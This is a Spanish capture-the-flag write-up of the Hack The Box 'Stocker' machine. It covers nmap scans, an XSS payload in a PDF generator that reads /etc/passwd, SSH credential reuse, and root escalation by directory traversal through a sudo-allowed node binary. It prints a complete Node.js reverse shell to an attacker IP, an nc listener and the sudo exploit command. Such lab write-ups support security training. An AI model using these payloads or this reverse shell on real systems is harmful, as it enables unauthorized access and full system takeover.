---
title: "Stocker"
date: "2025-02-22T00:04:43-05:00"
type: "maquinas"
draft: false
tags: ["PDF-Dinamico", "Inyección-NoSQL", "linux", "sudoers", "XSS", "Cross-Site-Scripting", "Server-Side", "Burpsuit"]
---

### Descripción:
Maquina sencilla que mediante una inyección NoSQL podemos saltar un login y luego mediante un generador de PDF’s dinamicos listar archivos y hallat credenciales, en la escalada explotamos un permiso de sudoers Node

# Enumeración

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn IP -oG allPorts
```

Esto nos mostrara que hay dos puertos el 22 y el 80.

```bash
whatweb IP
```

<a href="https://imgur.com/HeXx65d"><img src="https://i.imgur.com/HeXx65d.png" title="source: imgur.com" /></a>

Vemos el dominio que es `stocker.htb` lo agregamos al `/etc/hosts` y continuamos con el escaneo de puertos.

```bash
nmap -p22,80 -sVC 10.129.184.222 -A -oN target
```

<a href="https://imgur.com/IKfEl58"><img src="https://i.imgur.com/IKfEl58.png" title="source: imgur.com" /></a>

Vamos a listar subdominios a ver si encontramos algo interesante

```jsx
<img src=\"x\" onerror=\"document.write('<iframe src=file:///etc/passwd width=100% height=100%></iframe>')\" />
```

Solo hay dos usuarios con shell root y angoose, ahora vamos a empezar a listar archivos del subdominio `dev.stocker.htb` suponiendo que por lo general esta en `/var/www/dev/` si listamos el index.js:

<a href="https://imgur.com/zq1XUuZ"><img src="https://i.imgur.com/zq1XUuZ.png" title="source: imgur.com" /></a>

Hay lo que podria ser una contraseña de lo que parece ser el usuario `dev` pero si recordamos no hay ningun usuario dev por lo que vamos a probar la contraseña con angoose y nos funcionara mediante ssh.

# Root

Despues de conectarnos hacemos el tratamiento de la tty mas basico:

```jsx
export TERM=xterm
```

Listando permisos con sudo -l, y tenemos que hay un binario que podemos ejecutar que es node

<a href="https://imgur.com/i5MEYlw"><img src="https://i.imgur.com/i5MEYlw.png" title="source: imgur.com" /></a>

Vemos que solo podemos ejecutar los archivos de extension `js` en la carpeta `/usr/local/scripts/` pero podemos tratar de hacer un directory traversal por lo que lo primero que vamos a hacer es entrar a https://www.revshells.com/ y mirar la shell #2 que tienen para node

```jsx
cd /tmp
nano rev.js

(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(4444, "IP", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

Ahora lo que vamos a hacer es poner nuestra maquina en escucha y tartar de ejecutar el binario con los permisos sudo.

```bash
#Atacante
nc -lvnp 4444

#Victima 
sudo node /usr/local/scripts/../../../../tmp/rev.js
```

<a href="https://imgur.com/6XWJ8oP"><img src="https://i.imgur.com/6XWJ8oP.png" title="source: imgur.com" /></a>

Y con esto terminamos la maquina.
